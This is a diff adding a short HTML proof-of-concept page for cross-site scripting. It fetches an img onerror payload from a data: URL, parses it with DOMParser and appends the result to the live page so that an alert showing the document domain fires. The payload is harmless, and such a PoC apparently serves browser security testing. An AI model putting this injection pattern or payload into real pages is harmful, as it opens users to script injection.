@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<h1>Document Implementation XSS PoC</h1>
+<button id="execute">Click</button>
+<div id="output" class="result"></div>
+<script>
+  const output = document.getElementById('output');
+  const payload = `<img onerror='alert(document.domain)' src='foo'>`;
+  function ExecuteXSS() {
+    output.innerHTML = '';
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'data:text/html;charset=utf-8,' + encodeURIComponent(payload), true);
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        const responseDoc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
+        output.innerHTML += '<strong>Method :</strong> XMLHttpRequest injected.<br>';
+        document.body.append(responseDoc.body.firstChild);
+      }
+    };
+    xhr.send();
+  }
+  document.getElementById('execute').onclick = ExecuteXSS;
+</script>
